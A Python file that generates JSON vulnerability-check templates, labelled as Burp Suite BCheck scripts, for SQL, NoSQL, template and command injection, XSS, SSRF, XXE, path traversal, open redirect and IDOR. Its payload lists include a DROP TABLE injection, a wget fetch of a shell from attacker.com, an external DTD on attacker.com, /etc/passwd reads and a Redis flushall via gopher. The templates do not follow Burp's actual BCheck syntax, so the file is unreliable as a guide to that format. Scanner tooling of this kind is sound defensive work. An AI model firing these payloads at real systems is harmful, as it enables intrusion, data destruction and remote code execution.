#!/usr/bin/env python3
"""
BCheck Scripts for Burp Suite
Collection of automated security checks for critical vulnerabilities
"""

import json
import re
from typing import Dict, List, Any

class BCheckScripts:
    """Collection of BCheck scripts for different vulnerability types"""
    
    @staticmethod
    def sql_injection_detector():
        """BCheck script for SQL injection detection"""
        return {
            "metadata": {
                "name": "SQL Injection Detector",
                "description": "Detects SQL injection vulnerabilities in GET/POST parameters",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["sql-injection", "database", "critical"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "sql syntax",
                    "mysql_fetch_array",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite",
                    "Microsoft OLE DB Provider",
                    "mysql_num_rows",
                    "mysql_fetch_assoc",
                    "mysql_fetch_object",
                    "mysql_fetch_row",
                    "mysql_fetch_field",
                    "mysql_num_fields",
                    "mysql_list_dbs",
                    "mysql_list_tables",
                    "mysql_list_fields",
                    "SQLSTATE[",
                    "mysql error",
                    "sql error",
                    "database error"
                ]
            },
            "payloads": [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' UNION SELECT @@version--",
                "admin'--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR 'x'='x",
                "' UNION SELECT 1,2,3--",
                "'; WAITFOR DELAY '00:00:05'--"
            ]
        }
    
    @staticmethod
    def xss_detector():
        """BCheck script for XSS detection"""
        return {
            "metadata": {
                "name": "Cross-Site Scripting Detector",
                "description": "Detects reflected XSS vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["xss", "client-side", "critical"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "<script>alert(\"XSS\")</script>",
                    "<img src=x onerror=alert(\"XSS\")>",
                    "javascript:alert(\"XSS\")",
                    "<svg onload=alert(\"XSS\")>",
                    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                    "<body onload=alert(\"XSS\")>",
                    "<input onfocus=alert(\"XSS\") autofocus>"
                ]
            },
            "payloads": [
                "<script>alert(\"XSS\")</script>",
                "<img src=x onerror=alert(\"XSS\")>",
                "\"><script>alert(\"XSS\")</script>",
                "javascript:alert(\"XSS\")",
                "<svg onload=alert(\"XSS\")>",
                "\"><img src=x onerror=alert(\"XSS\")>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload=alert(\"XSS\")>",
                "<input onfocus=alert(\"XSS\") autofocus>",
                "<select onchange=alert(\"XSS\")><option>1</option></select>"
            ]
        }
    
    @staticmethod
    def ssrf_detector():
        """BCheck script for SSRF detection"""
        return {
            "metadata": {
                "name": "Server-Side Request Forgery Detector",
                "description": "Detects SSRF vulnerabilities through response time analysis",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["ssrf", "server-side", "critical"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "response_time": ">5000",
                "body_contains": [
                    "connection refused",
                    "connection timeout",
                    "no route to host",
                    "network is unreachable"
                ]
            },
            "payloads": [
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "http://[::1]",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://localhost:6379",
                "http://127.0.0.1:8080",
                "file:///etc/passwd",
                "file:///c:/windows/system32/drivers/etc/hosts",
                "dict://localhost:11211/stat",
                "ftp://localhost:21",
                "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*"
            ]
        }
    
    @staticmethod
    def xxe_detector():
        """BCheck script for XXE detection"""
        return {
            "metadata": {
                "name": "XML External Entity Detector",
                "description": "Detects XXE vulnerabilities in XML processing",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["xxe", "xml", "critical"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/xml"
                },
                "body": "{{payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "root:x:0:0",
                    "127.0.0.1",
                    "localhost",
                    "Microsoft Windows",
                    "SYSTEM",
                    "Administrator"
                ]
            },
            "payloads": [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><data>&file;</data>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE data [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;%int;%send;]>"
            ]
        }
    
    @staticmethod
    def command_injection_detector():
        """BCheck script for command injection detection"""
        return {
            "metadata": {
                "name": "Command Injection Detector",
                "description": "Detects OS command injection vulnerabilities",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["command-injection", "os-command", "critical"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "uid=",
                    "gid=",
                    "root:x:0:0",
                    "Active Connections",
                    "Proto Recv-Q Send-Q",
                    "PING 127.0.0.1",
                    "Microsoft Windows",
                    "Directory of",
                    "Volume Serial Number"
                ]
            },
            "payloads": [
                "; ls -la",
                "| whoami",
                "& dir",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| netstat -an",
                "& type C:\\windows\\system32\\drivers\\etc\\hosts",
                "; ping -c 1 127.0.0.1",
                "| wget http://attacker.com/shell"
            ]
        }
    
    @staticmethod
    def path_traversal_detector():
        """BCheck script for path traversal detection"""
        return {
            "metadata": {
                "name": "Path Traversal Detector",
                "description": "Detects directory traversal vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["path-traversal", "file-access", "high"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "root:x:0:0",
                    "127.0.0.1",
                    "localhost",
                    "Microsoft Windows",
                    "SYSTEM",
                    "Administrator",
                    "Volume Serial Number"
                ]
            },
            "payloads": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
            ]
        }
    
    @staticmethod
    def open_redirect_detector():
        """BCheck script for open redirect detection"""
        return {
            "metadata": {
                "name": "Open Redirect Detector",
                "description": "Detects open redirect vulnerabilities",
                "severity": "Medium",
                "confidence": "Certain",
                "tags": ["open-redirect", "redirect", "medium"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": [301, 302, 303, 307, 308],
                "headers": {
                    "Location": [
                        "https://evil.com",
                        "//evil.com",
                        "javascript:window.location=\"https://evil.com\""
                    ]
                }
            },
            "payloads": [
                "https://evil.com",
                "//evil.com",
                "javascript:window.location=\"https://evil.com\"",
                "data:text/html,<script>window.location=\"https://evil.com\"</script>",
                "https://attacker.com%0d%0aHost:%20legitimate.com"
            ]
        }
    
    @staticmethod
    def idor_detector():
        """BCheck script for IDOR detection"""
        return {
            "metadata": {
                "name": "IDOR Detector",
                "description": "Detects Insecure Direct Object Reference vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["idor", "authorization", "high"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "user_id",
                    "id",
                    "user",
                    "account",
                    "profile",
                    "order",
                    "invoice",
                    "document"
                ]
            },
            "payloads": [
                "1",
                "2",
                "admin",
                "test",
                "123",
                "999",
                "0",
                "-1"
            ]
        }
    
    @staticmethod
    def nosql_injection_detector():
        """BCheck script for NoSQL injection detection"""
        return {
            "metadata": {
                "name": "NoSQL Injection Detector",
                "description": "Detects NoSQL injection vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["nosql-injection", "database", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "mongo",
                    "mongodb",
                    "bson",
                    "objectid",
                    "json syntax",
                    "invalid json"
                ]
            },
            "payloads": [
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
                '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
                '{"username": {"$exists": true}, "password": {"$exists": true}}',
                '{"$where": "1==1"}',
                '{"$where": "this.username == this.password"}'
            ]
        }
    
    @staticmethod
    def template_injection_detector():
        """BCheck script for template injection detection"""
        return {
            "metadata": {
                "name": "Template Injection Detector",
                "description": "Detects server-side template injection vulnerabilities",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["template-injection", "ssti", "critical"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "7*7",
                    "49",
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "<%= 7*7 %>",
                    "{{config}}",
                    "{{settings}}"
                ]
            },
            "payloads": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{settings}}",
                "{{request}}",
                "{{self}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}"
            ]
        }

class BCheckGenerator:
    """Generate BCheck scripts for specific targets"""
    
    def __init__(self):
        self.scripts = BCheckScripts()
    
    def generate_all_scripts(self, target_url: str, parameters: List[str]) -> List[Dict[str, Any]]:
        """Generate all BCheck scripts for a target"""
        all_scripts = []
        
        # Get all script methods
        script_methods = [
            method for method in dir(self.scripts) 
            if method.endswith('_detector') and callable(getattr(self.scripts, method))
        ]
        
        for method_name in script_methods:
            method = getattr(self.scripts, method_name)
            script_template = method()
            
            # Generate scripts for each parameter
            for param in parameters:
                script = self.customize_script(script_template, target_url, param)
                all_scripts.append(script)
        
        return all_scripts
    
    def customize_script(self, script_template: Dict[str, Any], url: str, param: str) -> Dict[str, Any]:
        """Customize script template for specific target"""
        import copy
        script = copy.deepcopy(script_template)
        
        # Replace placeholders
        if 'request' in script:
            if 'url' in script['request']:
                script['request']['url'] = script['request']['url'].replace('{{url}}', url)
            
            if 'parameters' in script['request']:
                script['request']['parameters'] = {
                    param: script['request']['parameters']['{{param}}']
                }
        
        return script
    
    def save_scripts(self, scripts: List[Dict[str, Any]], filename: str):
        """Save BCheck scripts to JSON file"""
        with open(filename, 'w') as f:
            json.dump(scripts, f, indent=2)
        print(f"Saved {len(scripts)} BCheck scripts to {filename}")

# Example usage
if __name__ == "__main__":
    generator = BCheckGenerator()
    
    # Example target
    target_url = "http://example.com/vulnerable.php"
    parameters = ["id", "user", "file", "search"]
    
    # Generate all scripts
    scripts = generator.generate_all_scripts(target_url, parameters)
    
    # Save to file
    generator.save_scripts(scripts, "bcheck_scripts.json")
    
    print("BCheck scripts generated successfully!")
    print(f"Generated {len(scripts)} scripts for {len(parameters)} parameters") 